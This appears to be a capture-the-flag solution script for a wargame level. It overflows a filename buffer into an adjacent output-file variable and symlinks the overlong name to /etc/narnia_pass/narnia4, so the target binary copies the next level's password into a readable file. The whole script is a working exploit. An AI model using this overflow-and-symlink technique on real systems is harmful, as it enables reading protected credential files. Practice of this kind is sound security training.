#!/bin/bash
# just read how far are the local variables
# ifile and ofile
# we make ifile='a'*33, the last 'a' lies in ofile
# and will be used as output file
payload="$(python -c "print('a'*33)")"
echo -n $payload > arg1
ln -s /etc/narnia_pass/narnia4 $payload
touch a
chmod 777 a
rarun2 profile.rr2
cat a
